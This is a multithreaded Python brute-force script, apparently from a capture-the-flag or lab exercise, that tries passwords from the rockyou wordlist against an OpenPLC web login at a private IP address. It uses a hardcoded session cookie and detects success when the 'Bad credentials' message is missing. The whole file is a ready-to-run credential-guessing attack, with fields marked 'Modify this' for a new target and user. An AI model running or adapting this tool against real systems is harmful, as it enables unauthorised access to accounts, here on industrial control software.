#!/bin/env python3

import sys, requests
from pwn import *
import threading

url = 'http://10.10.11.7:8080/login'

session_cookie = 'eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZmuGwg.UcAzORfJ7uX8VW9aCapkfOf_DSY'

#proxy = {'http': '127.0.0.1:8080'}
proxy = {} # debugging

username = 'openplc' # Modify this
wordlist = '/usr/share/wordlists/rockyou.txt' # Modify this

threads = 20 # Modify this

threads_arr = [] # ignore this

# Ctrl + C

def def_handler(sig, frame):
    print('\n[x] Exiting...')
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Make login
def req_login(start_from, passwords):

    p1 = log.progress('Password')

    headers = {
        'Cookie': 'session=%s' % session_cookie
    }

    for i in range(start_from-1, len(passwords), threads):
        
        if password_found_event.is_set():
            # La única forma que encontré para detener el programa :(
            try:
                for t in threads_arr:
                    t.join()
            except RuntimeError:
                sys.exit(0)

        data = {
            'username': username,
            'password': passwords[i].strip()
        }

        req = requests.post(url, headers=headers, data=data, proxies=proxy, allow_redirects=True)

        p1.status('[%d:%d] %s' % (req.status_code, i+1, passwords[i]))

        if 'Bad credentials' not in req.text:
            
            p1.success(passwords[i])

            print('\n[*] %s:%s' % (username, passwords[i]))

            password_found_event.set()
        

if __name__ == '__main__':

    password_found_event = threading.Event()

    print()
    with open(wordlist, 'r', encoding='latin-1') as file:

        p = log.progress('Processing the wordlist...')
        passwords = file.readlines()
        p.success('Wordlist Processed Successfully!')
    
    print()


    if threads < 1:
        threads = 1

    for i in range(1, threads+1):
        thread = threading.Thread(target=req_login, args=(i, passwords))
        threads_arr.append(thread)
        thread.start()

    for t in threads_arr:
        t.join()

